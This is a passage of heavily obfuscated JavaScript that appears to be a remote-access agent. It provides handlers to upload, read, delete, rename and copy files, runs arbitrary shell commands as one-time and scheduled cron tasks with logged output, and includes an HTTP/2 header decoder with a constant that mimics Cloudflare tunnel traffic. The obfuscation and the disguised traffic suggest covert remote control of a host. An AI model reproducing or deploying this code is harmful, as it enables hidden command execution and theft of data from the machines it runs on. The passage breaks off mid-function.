                a0l[c3(0x3ae)](m, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l['rmdirSync'](s);
                } catch (v) {
                }
                return {
                    'status': 'ok',
                    'path': a0n[c3(0x4b9)](a0O['FILE_ROOT'], j),
                    'chunk_id': k,
                    'completed': !![],
                    'message': c3(0x7f5)
                };
            }
            return {
                'status': 'ok',
                'path': a0n[c3(0x4b9)](a0O[c3(0x447)], j),
                'chunk_id': k,
                'completed': ![],
                'message': c3(0x5af) + k + '\x20uploaded.\x20Waiting\x20for\x20remaining\x20blocks.'
            };
        }
        return a0l[c3(0x22c)](j, c), {
            'status': 'ok',
            'path': a0n[c3(0x4b9)](a0O[c3(0x447)], j),
            'chunk_id': 0x0,
            'completed': !![],
            'message': g[c3(0x4d5)]
        };
    }
    static async [a0aQ(0x38d)](a) {
        const c4 = a0aQ, b = {
                'zVABD': function (h, i) {
                    return h(i);
                },
                'pnejR': c4(0x7bb),
                'FDlDm': 'File\x20not\x20found'
            }, c = a0n[c4(0x26a)](a0O[c4(0x447)], a);
        if (!b[c4(0x5e3)](a0V, c))
            throw new Error(b[c4(0x834)]);
        if (!a0l[c4(0x235)](c))
            throw new Error(b[c4(0x5b7)]);
        const d = a0l['statSync'](c), f = a0l['readFileSync'](c), g = a0v[c4(0x645)](f);
        return {
            'path': a0n[c4(0x4b9)](a0O['FILE_ROOT'], c),
            'content': g,
            'size': d[c4(0x40c)]
        };
    }
    static async ['deleteFiles'](a) {
        const c5 = a0aQ, b = {
                'qqiLk': function (d, f) {
                    return d(f);
                },
                'CieFq': 'deleted',
                'whmAy': 'error'
            }, c = [];
        for (const d of a) {
            const f = a0n['resolve'](a0O[c5(0x447)], d);
            if (!b[c5(0x597)](a0V, f)) {
                c[c5(0x381)]({
                    'path': d,
                    'status': 'access_denied'
                });
                continue;
            }
            try {
                if (a0l[c5(0x235)](f)) {
                    const g = a0l['statSync'](f);
                    g['isDirectory']() ? a0l[c5(0x3ae)](f, {
                        'recursive': !![],
                        'force': !![]
                    }) : a0l[c5(0x1fe)](f), c['push']({
                        'path': d,
                        'status': b[c5(0x274)]
                    });
                } else
                    c['push']({
                        'path': d,
                        'status': c5(0x4f3)
                    });
            } catch (h) {
                c[c5(0x381)]({
                    'path': d,
                    'status': b['whmAy'],
                    'message': h[c5(0x346)]
                });
            }
        }
        return c;
    }
    static async [a0aQ(0x4a6)](a) {
        const c6 = a0aQ, b = {
                'YEkZR': function (d, f) {
                    return d(f);
                },
                'pDXFq': c6(0x546)
            }, c = [];
        for (const [d, f] of Object[c6(0x85b)](a)) {
            const g = a0n[c6(0x26a)](a0O['FILE_ROOT'], d), h = a0n[c6(0x26a)](a0O['FILE_ROOT'], f);
            if (!b[c6(0x375)](a0V, g) || !b[c6(0x375)](a0V, h)) {
                c[c6(0x381)]({
                    'from': d,
                    'to': f,
                    'status': b[c6(0x495)]
                });
                continue;
            }
            try {
                const i = a0n[c6(0x7c9)](h);
                !a0l[c6(0x235)](i) && a0l['mkdirSync'](i, { 'recursive': !![] }), a0l[c6(0x3d8)](g, h), c['push']({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (j) {
                c[c6(0x381)]({
                    'from': d,
                    'to': f,
                    'status': c6(0x484),
                    'message': j[c6(0x346)]
                });
            }
        }
        return c;
    }
    static async ['copyFiles'](a) {
        const c7 = a0aQ, b = {
                'jzpzH': function (d, f) {
                    return d(f);
                },
                'KIHNp': 'access_denied',
                'qrIZt': c7(0x4f3),
                'rLdFU': c7(0x484)
            }, c = [];
        for (const [d, f] of Object[c7(0x85b)](a)) {
            const g = a0n[c7(0x26a)](a0O[c7(0x447)], d), h = a0n[c7(0x26a)](a0O[c7(0x447)], f);
            if (!a0V(g) || !b['jzpzH'](a0V, h)) {
                c[c7(0x381)]({
                    'from': d,
                    'to': f,
                    'status': b['KIHNp']
                });
                continue;
            }
            try {
                if (!a0l[c7(0x235)](g)) {
                    c[c7(0x381)]({
                        'from': d,
                        'to': f,
                        'status': b['qrIZt']
                    });
                    continue;
                }
                const i = a0n['dirname'](h);
                !a0l[c7(0x235)](i) && a0l[c7(0x354)](i, { 'recursive': !![] });
                const j = a0l[c7(0x1ce)](g);
                if (j[c7(0x41b)]()) {
                    if (a0l['cpSync'])
                        a0l[c7(0x46a)](g, h, { 'recursive': !![] });
                    else {
                        const k = (l, m) => {
                            const c8 = c7;
                            if (a0l[c8(0x1ce)](l)[c8(0x41b)]()) {
                                if (!a0l['existsSync'](m))
                                    a0l[c8(0x354)](m, { 'recursive': !![] });
                                for (const n of a0l[c8(0x48f)](l)) {
                                    k(a0n['join'](l, n), a0n[c8(0x48d)](m, n));
                                }
                            } else
                                a0l[c8(0x267)](l, m);
                        };
                        k(g, h);
                    }
                } else
                    a0l[c7(0x267)](g, h);
                c[c7(0x381)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (l) {
                c[c7(0x381)]({
                    'from': d,
                    'to': f,
                    'status': b['rLdFU'],
                    'message': l[c7(0x346)]
                });
            }
        }
        return c;
    }
    static async [a0aQ(0x519)](a) {
        const c9 = a0aQ, b = {
                'GwOUB': function (d, f) {
                    return d(f);
                },
                'fRjhO': c9(0x7bb)
            }, c = a0n[c9(0x26a)](a0O[c9(0x447)], a);
        if (!b[c9(0x2bd)](a0V, c))
            throw new Error(b[c9(0x70c)]);
        return a0l['mkdirSync'](c, { 'recursive': !![] }), {
            'status': 'ok',
            'path': a0n['relative'](a0O[c9(0x447)], c)
        };
    }
}
class a0X {
    static ['cronJobs'] = new Map();
    static [a0aQ(0x61e)](a, b) {
        const ca = a0aQ, c = {
                'pNnFj': function (d, f) {
                    return d > f;
                },
                'PDHjB': function (d, f) {
                    return d - f;
                }
            };
        a[ca(0x381)](b), c[ca(0x887)](a['length'], a0O['MAX_TASK_LOG_SIZE']) && a[ca(0x264)](0x0, c[ca(0x7cb)](a['length'], a0O[ca(0x6b3)]));
    }
    static [a0aQ(0x69b)](a, b, c, d, f = null) {
        const cb = a0aQ, g = new Date()[cb(0x860)]();
        return {
            'ts': g,
            'cmd': a,
            'output': b,
            'exitcode': c,
            'type': d,
            'cron': f,
            'formatted': g + cb(0x23e) + a + '\x20----\x20exitcode=' + c + '\x0a' + (b?.['trim']() || '')
        };
    }
    static [a0aQ(0x60a)]() {
        const cc = a0aQ;
        return {
            'status': 'ok',
            'count': a0O[cc(0x1de)][cc(0x32c)],
            'tasks': a0O[cc(0x1de)]
        };
    }
    static async [a0aQ(0x3d5)](a) {
        const cd = a0aQ, b = {
                'VYYgY': function (d, f) {
                    return d < f;
                },
                'fPPtM': cd(0x80e),
                'Jxqms': function (d, f) {
                    return d === f;
                },
                'ZGXkO': cd(0x484)
            };
        a0O[cd(0x1de)] = a || [], a0O[cd(0x7b7)] = !![];
        const c = [];
        for (let d = 0x0; b[cd(0x804)](d, a0O[cd(0x1de)]['length']); d++) {
            const f = a0O[cd(0x1de)][d], g = await a0U['execute'](f), h = this[cd(0x69b)](f, g[cd(0x219)], g['exitcode'], b['fPPtM']);
            this['_appendLog'](a0O[cd(0x5ef)], h), c[cd(0x381)]({
                'index': d,
                'cmd': f,
                'exitcode': g[cd(0x29d)],
                'output': g[cd(0x219)],
                'status': b[cd(0x50c)](g[cd(0x29d)], 0x0) ? 'ok' : b[cd(0x84d)]
            });
        }
        return a0O[cd(0x7b7)] = ![], {
            'status': 'ok',
            'count': a0O[cd(0x1de)][cd(0x32c)],
            'tasks': a0O[cd(0x1de)],
            'executed': c
        };
    }
    static [a0aQ(0x2bc)]() {
        const ce = a0aQ;
        return {
            'status': 'ok',
            'count': Object[ce(0x38a)](a0O[ce(0x3ff)])['length'],
            'tasks': a0O[ce(0x3ff)]
        };
    }
    static [a0aQ(0x7d2)](a) {
        const cf = a0aQ, b = {
                'gPixE': cf(0x858),
                'SJtIE': function (d, f) {
                    return d === f;
                },
                'cmCoW': function (d, f) {
                    return d - f;
                },
                'fxPlq': function (d, f) {
                    return d || f;
                },
                'SIyPv': function (d, f) {
                    return d > f;
                }
            };
        this[cf(0x282)][cf(0x29f)](d => {
            const cg = cf;
            typeof d[cg(0x374)] === b[cg(0x1e8)] && d['stop'](), b[cg(0x7d6)](typeof d[cg(0x79b)], b['gPixE']) && d[cg(0x79b)]();
        }), this[cf(0x282)]['clear']();
        const c = [];
        for (const d of Object['keys'](a || {})) {
            !a0s[cf(0x20f)](d) && c['push'](d);
        }
        if (c['length'] > 0x0)
            return {
                'status': cf(0x484),
                'message': cf(0x2a4) + c[cf(0x48d)](',\x20'),
                'valid_count': b['cmCoW'](Object[cf(0x38a)](b[cf(0x232)](a, {}))[cf(0x32c)], c[cf(0x32c)])
            };
        a0O[cf(0x3ff)] = b[cf(0x232)](a, {});
        for (const [f, g] of Object[cf(0x85b)](a0O[cf(0x3ff)])) {
            const h = a0s[cf(0x612)](f, async () => {
                const ch = cf, i = await a0U[ch(0x88b)](g), j = this[ch(0x69b)](g, i[ch(0x219)], i[ch(0x29d)], ch(0x609), f);
                this[ch(0x61e)](a0O['crontasks_log'], j);
            });
            this[cf(0x282)]['set'](f, h);
        }
        return a0O[cf(0x4a8)] = b['SIyPv'](Object[cf(0x38a)](a0O[cf(0x3ff)])[cf(0x32c)], 0x0), {
            'status': 'ok',
            'count': Object['keys'](a0O[cf(0x3ff)])[cf(0x32c)],
            'tasks': a0O[cf(0x3ff)]
        };
    }
    static [a0aQ(0x1e6)]() {
        const ci = a0aQ;
        return {
            'onetime': {
                'pending': a0O[ci(0x7b7)],
                'count': a0O[ci(0x1de)]['length']
            },
            'cron': {
                'active': a0O[ci(0x4a8)],
                'count': Object[ci(0x38a)](a0O['crontasks'])[ci(0x32c)],
                'check_interval': a0O[ci(0x30b)]
            }
        };
    }
    static [a0aQ(0x72e)](a = 0x32) {
        const cj = a0aQ, b = a0O[cj(0x5ef)][cj(0x4a4)](-a);
        return {
            'status': 'ok',
            'count': b[cj(0x32c)],
            'logs': b
        };
    }
    static ['getCronLogs'](a = 0x32) {
        const ck = a0aQ, b = a0O['crontasks_log'][ck(0x4a4)](-a);
        return {
            'status': 'ok',
            'count': b['length'],
            'logs': b
        };
    }
    static [a0aQ(0x725)]() {
        const cl = a0aQ, a = { 'bPnmq': 'onetime' }, b = a0O[cl(0x5ef)][cl(0x32c)];
        return a0O['onetimetasks_log'] = [], {
            'status': 'ok',
            'cleared': a['bPnmq']
        };
    }
    static ['clearCronLogs']() {
        const cm = a0aQ, a = { 'kIOzW': cm(0x609) }, b = a0O['crontasks_log'][cm(0x32c)];
        return a0O[cm(0x368)] = [], {
            'status': 'ok',
            'cleared': a[cm(0x236)]
        };
    }
    static ['getLogSummary']() {
        const cn = a0aQ, a = {
                'WPePc': function (g, h) {
                    return g - h;
                },
                'VTsOX': function (g, h) {
                    return g - h;
                }
            }, b = a0O[cn(0x5ef)][cn(0x4c7)](g => g[cn(0x29d)] === 0x0)['length'], c = a[cn(0x529)](a0O['onetimetasks_log'][cn(0x32c)], b), d = a0O[cn(0x368)][cn(0x4c7)](g => g[cn(0x29d)] === 0x0)[cn(0x32c)], f = a[cn(0x454)](a0O['crontasks_log']['length'], d);
        return {
            'onetime': {
                'total_logged': a0O[cn(0x5ef)][cn(0x32c)],
                'max_capacity': a0O['MAX_TASK_LOG_SIZE'],
                'recent_success': b,
                'recent_failed': c
            },
            'cron': {
                'total_logged': a0O[cn(0x368)]['length'],
                'max_capacity': a0O['MAX_TASK_LOG_SIZE'],
                'recent_success': d,
                'recent_failed': f
            }
        };
    }
    static async [a0aQ(0x301)]() {
        const co = a0aQ, a = { 'HYTjv': co(0x80e) }, b = [];
        for (let c = 0x0; c < a0O[co(0x1de)]['length']; c++) {
            const d = a0O[co(0x1de)][c], f = await a0U[co(0x88b)](d), g = this['_formatLogEntry'](d, f[co(0x219)], f['exitcode'], a[co(0x522)]);
            this['_appendLog'](a0O[co(0x5ef)], g), b[co(0x381)]({
                'cmd': d,
                'exitcode': f['exitcode'],
                'output': f[co(0x219)],
                'timeout': f['timeout']
            });
        }
        return a0O[co(0x7b7)] = ![], {
            'status': 'ok',
            'executed': b['length'],
            'results': b
        };
    }
}
const a0Y = a0aQ(0x7ed), a0Z = [
        a0aQ(0x21c),
        a0aQ(0x416)
    ], a0a0 = 0x1ea4, a0a1 = 'cf-cloudflared-proxy-connection-upgrade', a0a2 = a0aQ(0x38f), a0a3 = 0x4000, a0a4 = [
        [
            a0aQ(0x4d4),
            ''
        ],
        [
            a0aQ(0x6e3),
            a0aQ(0x63f)
        ],
        [
            a0aQ(0x6e3),
            a0aQ(0x208)
        ],
        [
            a0aQ(0x787),
            '/'
        ],
        [
            a0aQ(0x787),
            a0aQ(0x669)
        ],
        [
            a0aQ(0x615),
            a0aQ(0x80f)
        ],
        [
            ':scheme',
            a0aQ(0x760)
        ],
        [
            a0aQ(0x62f),
            '200'
        ],
        [
            a0aQ(0x62f),
            a0aQ(0x2c8)
        ],
        [
            a0aQ(0x62f),
            a0aQ(0x5d0)
        ],
        [
            ':status',
            a0aQ(0x271)
        ],
        [
            a0aQ(0x62f),
            a0aQ(0x5c2)
        ],
        [
            a0aQ(0x62f),
            '404'
        ],
        [
            a0aQ(0x62f),
            a0aQ(0x61b)
        ],
        [
            a0aQ(0x1ea),
            ''
        ],
        [
            'accept-encoding',
            a0aQ(0x472)
        ],
        [
            'accept-language',
            ''
        ],
        [
            a0aQ(0x3ca),
            ''
        ],
        [
            a0aQ(0x85a),
            ''
        ],
        [
            a0aQ(0x54d),
            ''
        ],
        [
            a0aQ(0x350),
            ''
        ],
        [
            a0aQ(0x530),
            ''
        ],
        [
            'authorization',
            ''
        ],
        [
            a0aQ(0x6ee),
            ''
        ],
        [
            a0aQ(0x5b6),
            ''
        ],
        [
            a0aQ(0x632),
            ''
        ],
        [
            a0aQ(0x22a),
            ''
        ],
        [
            'content-length',
            ''
        ],
        [
            'content-location',
            ''
        ],
        [
            'content-range',
            ''
        ],
        [
            a0aQ(0x22d),
            ''
        ],
        [
            a0aQ(0x295),
            ''
        ],
        [
            a0aQ(0x7ec),
            ''
        ],
        [
            'etag',
            ''
        ],
        [
            a0aQ(0x7db),
            ''
        ],
        [
            a0aQ(0x670),
            ''
        ],
        [
            a0aQ(0x45b),
            ''
        ],
        [
            a0aQ(0x37c),
            ''
        ],
        [
            a0aQ(0x379),
            ''
        ],
        [
            a0aQ(0x700),
            ''
        ],
        [
            a0aQ(0x6c3),
            ''
        ],
        [
            a0aQ(0x506),
            ''
        ],
        [
            a0aQ(0x5cc),
            ''
        ],
        [
            'last-modified',
            ''
        ],
        [
            a0aQ(0x866),
            ''
        ],
        [
            a0aQ(0x30d),
            ''
        ],
        [
            'max-forwards',
            ''
        ],
        [
            a0aQ(0x26d),
            ''
        ],
        [
            'proxy-authorization',
            ''
        ],
        [
            a0aQ(0x5f8),
            ''
        ],
        [
            'referer',
            ''
        ],
        [
            a0aQ(0x384),
            ''
        ],
        [
            a0aQ(0x5fa),
            ''
        ],
        [
            a0aQ(0x5f2),
            ''
        ],
        [
            a0aQ(0x5dc),
            ''
        ],
        [
            a0aQ(0x3b8),
            ''
        ],
        [
            a0aQ(0x2b7),
            ''
        ],
        [
            'user-agent',
            ''
        ],
        [
            a0aQ(0x33c),
            ''
        ],
        [
            a0aQ(0x723),
            ''
        ],
        [
            a0aQ(0x3a1),
            ''
        ]
    ], a0a5 = [
        0x1ff8,
        0x7fffd8,
        0xfffffe2,
        0xfffffe3,
        0xfffffe4,
        0xfffffe5,
        0xfffffe6,
        0xfffffe7,
        0xfffffe8,
        0xffffea,
        0x3ffffffc,
        0xfffffe9,
        0xfffffea,
        0x3ffffffd,
        0xfffffeb,
        0xfffffec,
        0xfffffed,
        0xfffffee,
        0xfffffef,
        0xffffff0,
        0xffffff1,
        0xffffff2,
        0x3ffffffe,
        0xffffff3,
        0xffffff4,
        0xffffff5,
        0xffffff6,
        0xffffff7,
        0xffffff8,
        0xffffff9,
        0xffffffa,
        0xffffffb,
        0x14,
        0x3f8,
        0x3f9,
        0xffa,
        0x1ff9,
        0x15,
        0xf8,
        0x7fa,
        0x3fa,
        0x3fb,
        0xf9,
        0x7fb,
        0xfa,
        0x16,
        0x17,
        0x18,
        0x0,
        0x1,
        0x2,
        0x19,
        0x1a,
        0x1b,
        0x1c,
        0x1d,
        0x1e,
        0x1f,
        0x5c,
        0xfb,
        0x7ffc,
        0x20,
        0xffb,
        0x3fc,
        0x1ffa,
        0x21,
        0x5d,
        0x5e,
        0x5f,
        0x60,
        0x61,
        0x62,
        0x63,
        0x64,
        0x65,
        0x66,
        0x67,
        0x68,
        0x69,
        0x6a,
        0x6b,
        0x6c,
        0x6d,
        0x6e,
        0x6f,
        0x70,
        0x71,
        0x72,
        0xfc,
        0x73,
        0xfd,
        0x1ffb,
        0x7fff0,
        0x1ffc,
        0x3ffc,
        0x22,
        0x7ffd,
        0x3,
        0x23,
        0x4,
        0x24,
        0x5,
        0x25,
        0x26,
        0x27,
        0x6,
        0x74,
        0x75,
        0x28,
        0x29,
        0x2a,
        0x7,
        0x2b,
        0x76,
        0x2c,
        0x8,
        0x9,
        0x2d,
        0x77,
        0x78,
        0x79,
        0x7a,
        0x7b,
        0x7ffe,
        0x7fc,
        0x3ffd,
        0x1ffd,
        0xffffffc,
        0xfffe6,
        0x3fffd2,
        0xfffe7,
        0xfffe8,
        0x3fffd3,
        0x3fffd4,
        0x3fffd5,
        0x7fffd9,
        0x3fffd6,
        0x7fffda,
        0x7fffdb,
        0x7fffdc,
        0x7fffdd,
        0x7fffde,
        0xffffeb,
        0x7fffdf,
        0xffffec,
        0xffffed,
        0x3fffd7,
        0x7fffe0,
        0xffffee,
        0x7fffe1,
        0x7fffe2,
        0x7fffe3,
        0x7fffe4,
        0x1fffdc,
        0x3fffd8,
        0x7fffe5,
        0x3fffd9,
        0x7fffe6,
        0x7fffe7,
        0xffffef,
        0x3fffda,
        0x1fffdd,
        0xfffe9,
        0x3fffdb,
        0x3fffdc,
        0x7fffe8,
        0x7fffe9,
        0x1fffde,
        0x7fffea,
        0x3fffdd,
        0x3fffde,
        0xfffff0,
        0x1fffdf,
        0x3fffdf,
        0x7fffeb,
        0x7fffec,
        0x1fffe0,
        0x1fffe1,
        0x3fffe0,
        0x1fffe2,
        0x7fffed,
        0x3fffe1,
        0x7fffee,
        0x7fffef,
        0xfffea,
        0x3fffe2,
        0x3fffe3,
        0x3fffe4,
        0x7ffff0,
        0x3fffe5,
        0x3fffe6,
        0x7ffff1,
        0x3ffffe0,
        0x3ffffe1,
        0xfffeb,
        0x7fff1,
        0x3fffe7,
        0x7ffff2,
        0x3fffe8,
        0x1ffffec,
        0x3ffffe2,
        0x3ffffe3,
        0x3ffffe4,
        0x7ffffde,
        0x7ffffdf,
        0x3ffffe5,
        0xfffff1,
        0x1ffffed,
        0x7fff2,
        0x1fffe3,
        0x3ffffe6,
        0x7ffffe0,
        0x7ffffe1,
        0x3ffffe7,
        0x7ffffe2,
        0xfffff2,
        0x1fffe4,
        0x1fffe5,
        0x3ffffe8,
        0x3ffffe9,
        0xffffffd,
        0x7ffffe3,
        0x7ffffe4,
        0x7ffffe5,
        0xfffec,
        0xfffff3,
        0xfffed,
        0x1fffe6,
        0x3fffe9,
        0x1fffe7,
        0x1fffe8,
        0x7ffff3,
        0x3fffea,
        0x3fffeb,
        0x1ffffee,
        0x1ffffef,
        0xfffff4,
        0xfffff5,
        0x3ffffea,
        0x7ffff4,
        0x3ffffeb,
        0x7ffffe6,
        0x3ffffec,
        0x3ffffed,
        0x7ffffe7,
        0x7ffffe8,
        0x7ffffe9,
        0x7ffffea,
        0x7ffffeb,
        0xffffffe,
        0x7ffffec,
        0x7ffffed,
        0x7ffffee,
        0x7ffffef,
        0x7fffff0,
        0x3ffffee,
        0x3fffffff
    ], a0a6 = [
        0xd,
        0x17,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x18,
        0x1e,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x6,
        0xa,
        0xa,
        0xc,
        0xd,
        0x6,
        0x8,
        0xb,
        0xa,
        0xa,
        0x8,
        0xb,
        0x8,
        0x6,
        0x6,
        0x6,
        0x5,
        0x5,
        0x5,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x7,
        0x8,
        0xf,
        0x6,
        0xc,
        0xa,
        0xd,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x8,
        0x7,
        0x8,
        0xd,
        0x13,
        0xd,
        0xe,
        0x6,
        0xf,
        0x5,
        0x6,
        0x5,
        0x6,
        0x5,
        0x6,
        0x6,
        0x6,
        0x5,
        0x7,
        0x7,
        0x6,
        0x6,
        0x6,
        0x5,
        0x6,
        0x7,
        0x6,
        0x5,
        0x5,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0xf,
        0xb,
        0xe,
        0xd,
        0x1c,
        0x14,
        0x16,
        0x14,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x17,
        0x17,
        0x17,
        0x18,
        0x17,
        0x18,
        0x18,
        0x16,
        0x17,
        0x18,
        0x17,
        0x17,
        0x17,
        0x17,
        0x15,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x18,
        0x16,
        0x15,
        0x14,
        0x16,
        0x16,
        0x17,
        0x17,
        0x15,
        0x17,
        0x16,
        0x16,
        0x18,
        0x15,
        0x16,
        0x17,
        0x17,
        0x15,
        0x15,
        0x16,
        0x15,
        0x17,
        0x16,
        0x17,
        0x17,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x16,
        0x17,
        0x1a,
        0x1a,
        0x14,
        0x13,
        0x16,
        0x17,
        0x16,
        0x19,
        0x1a,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x18,
        0x19,
        0x13,
        0x15,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x1b,
        0x18,
        0x15,
        0x15,
        0x1a,
        0x1a,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x14,
        0x18,
        0x14,
        0x15,
        0x16,
        0x15,
        0x15,
        0x17,
        0x16,
        0x16,
        0x19,
        0x19,
        0x18,
        0x18,
        0x1a,
        0x17,
        0x1a,
        0x1b,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1a,
        0x1e
    ];
function a0a7() {
    const cp = a0aQ, a = {
            'CkKTx': function (c, d) {
                return c - d;
            },
            'Ibzic': function (c, d) {
                return c & d;
            },
            'tVPfv': function (c, d) {
                return c >> d;
            },
            'EDOAN': function (c, d) {
                return c === d;
            },
            'UakcN': function (c, d) {
                return c + d;
            }
        }, b = [
            null,
            null,
            -0x1,
            0x0
        ];
    for (let c = 0x0; c < a0a5[cp(0x32c)]; c++) {
        const d = a0a5[c], f = a0a6[c];
        let g = b;
        for (let h = a['CkKTx'](f, 0x1); h >= 0x0; h--) {
            const i = a[cp(0x318)](a['tVPfv'](d, h), 0x1);
            a[cp(0x339)](g[i], null) && (g[i] = [
                null,
                null,
                -0x1,
                a[cp(0x3b0)](g[0x3], 0x1)
            ]), g = g[i];
        }
        g[0x2] = c;
    }
    return b;
}
const a0a8 = a0a7();
function a0a9(a) {
    const cq = a0aQ, b = {
            'hCrhD': function (h, i) {
                return h >= i;
            },
            'fyllO': function (h, i) {
                return h & i;
            },
            'uGmhA': function (h, i) {
                return h >> i;
            },
            'QKWhN': function (h, i) {
                return h << i;
            },
            'CJJOj': function (h, i) {
                return h === i;
            },
            'vxgxc': function (h, i) {
                return h > i;
            },
            'ZLGdM': function (h, i) {
                return h !== i;
            },
            'FOGpH': function (h, i) {
                return h - i;
            },
            'EGUNW': cq(0x591)
        }, c = [];
    let d = a0a8, f = 0x0, g = 0x0;
    for (const h of a) {
        for (let i = 0x7; b[cq(0x7b0)](i, 0x0); i--) {
            const j = b[cq(0x85f)](b[cq(0x325)](h, i), 0x1);
            f = b[cq(0x5fc)](f, 0x1) | j, g += 0x1, d = d[j];
            if (b['CJJOj'](d, null))
                throw new Error(cq(0x66f));
            if (b[cq(0x7b0)](d[0x2], 0x0)) {
                const k = '4|2|1|3|0'[cq(0x281)]('|');
                let l = 0x0;
                while (!![]) {
                    switch (k[l++]) {
                    case '0':
                        g = 0x0;
                        continue;
                    case '1':
                        d = a0a8;
                        continue;
                    case '2':
                        c[cq(0x381)](d[0x2]);
                        continue;
                    case '3':
                        f = 0x0;
                        continue;
                    case '4':
                        if (d[0x2] === 0x100)
                            throw new Error(cq(0x2ab));
                        continue;
                    }
                    break;
                }
            }
        }
    }
    if (b[cq(0x239)](g, 0x7) || b[cq(0x822)](f, b[cq(0x2d8)](b[cq(0x5fc)](0x1, g), 0x1)))
        throw new Error(b[cq(0x25e)]);
    return Buffer['from'](c);
}
function a0aa(a, b, c) {
    const cr = a0aQ, d = {
            'Sqild': function (j, k) {
                return j >= k;
            },
            'hrlWz': cr(0x4fe),
            'zTAie': function (j, k) {
                return j - k;
            },
            'qoUdz': function (j, k) {
                return j << k;
            },
            'AKlnu': function (j, k) {
                return j & k;
            },
            'nnVvU': function (j, k) {
                return j >= k;
            },
            'KmMWU': function (j, k) {
                return j * k;
            },
            'uhkaL': function (j, k) {
                return j === k;
            },
            'fEVtn': function (j, k) {
                return j & k;
            },
            'XbmGj': function (j, k) {
                return j > k;
            }
        };
    if (d[cr(0x471)](b, a[cr(0x32c)]))
        throw new Error(d['hrlWz']);
    const f = a[b];
    b += 0x1;
    const g = d[cr(0x73a)](d[cr(0x27b)](0x1, c), 0x1);
    let h = d[cr(0x711)](f, g);
    if (h < g)
        return [
            h,
            b
        ];
    let i = 0x0;
    while (!![]) {
        if (d[cr(0x382)](b, a[cr(0x32c)]))
            throw new Error(d[cr(0x5be)]);
        const j = a[b];
        b += 0x1, h += d[cr(0x71d)](d[cr(0x711)](j, 0x7f), Math[cr(0x7bd)](0x2, i));
        if (d['uhkaL'](d[cr(0x65b)](j, 0x80), 0x0))
            return [
                h,
                b
            ];
        i += 0x7;
        if (d[cr(0x81f)](i, 0x1c))
            throw new Error(cr(0x3ea));
    }
}
function a0ab(a, b) {
    const cs = a0aQ, c = {
            'GlClF': function (j, k) {
                return j >= k;
            },
            'UfEHL': cs(0x5de),
            'tGZqz': function (j, k) {
                return j & k;
            },
            'XYbtA': function (j, k) {
                return j + k;
            },
            'PdPOj': function (j, k) {
                return j > k;
            },
            'OpFbJ': 'truncated\x20HPACK\x20string\x20data',
            'jklRb': function (j, k) {
                return j(k);
            }
        };
    if (c[cs(0x717)](b, a[cs(0x32c)]))
        throw new Error(c[cs(0x209)]);
    const d = Boolean(c[cs(0x1fa)](a[b], 0x80)), [f, g] = a0aa(a, b, 0x7), h = c['XYbtA'](g, f);
    if (c[cs(0x802)](h, a[cs(0x32c)]))
        throw new Error(c[cs(0x3a2)]);
    const i = a['subarray'](g, h);
    return [
        d ? c[cs(0x2b5)](a0a9, i) : i,
        h
    ];
}
class a0ac {
    constructor() {
        const ct = a0aQ;
        this[ct(0x3ee)] = [], this[ct(0x223)] = 0x0, this[ct(0x2a9)] = 0x1000;
    }
    ['tableEntry'](a) {
        const cu = a0aQ, b = {
                'GvvoZ': function (d, f) {
                    return d <= f;
                },
                'uYtBO': cu(0x6f0),
                'HbBYK': function (d, f) {
                    return d <= f;
                },
                'UwKgh': function (d, f) {
                    return d - f;
                },
                'zGoMy': function (d, f) {
                    return d - f;
                },
                'PSHNd': function (d, f) {
                    return d >= f;
                },
                'mFKuc': cu(0x473)
            };
        if (b['GvvoZ'](a, 0x0))
            throw new Error(b[cu(0x4cf)]);
        if (b['HbBYK'](a, a0a4[cu(0x32c)]))
            return a0a4[b[cu(0x41e)](a, 0x1)];
        const c = b[cu(0x7e4)](b[cu(0x7e4)](a, a0a4[cu(0x32c)]), 0x1);
        if (c < 0x0 || b['PSHNd'](c, this[cu(0x3ee)][cu(0x32c)]))
            throw new Error(b[cu(0x742)]);
        return this['dynamic'][c];
    }
    [a0aQ(0x1d9)](a, b) {
        const cv = a0aQ, c = {
                'QSOQC': function (f, g) {
                    return f + g;
                },
                'ZAUOn': function (f, g) {
                    return f > g;
                },
                'sQdFB': function (f, g) {
                    return f > g;
                },
                'WsaBa': function (f, g) {
                    return f + g;
                },
                'KSkzn': cv(0x592)
            }, d = c[cv(0x3c3)](c[cv(0x3c3)](0x20, Buffer['byteLength'](a, cv(0x592))), Buffer['byteLength'](b, cv(0x592)));
        if (c['ZAUOn'](d, this[cv(0x2a9)])) {
            this[cv(0x3ee)] = [], this[cv(0x223)] = 0x0;
            return;
        }
        while (c['sQdFB'](this[cv(0x3ee)][cv(0x32c)], 0x0) && c[cv(0x3c3)](this[cv(0x223)], d) > this[cv(0x2a9)]) {
            const [f, g] = this[cv(0x3ee)][cv(0x43f)]();
            this[cv(0x223)] -= c[cv(0x2fa)](0x20, Buffer['byteLength'](f, cv(0x592))) + Buffer[cv(0x352)](g, c[cv(0x46f)]);
        }
        this[cv(0x3ee)][cv(0x260)]([
            a,
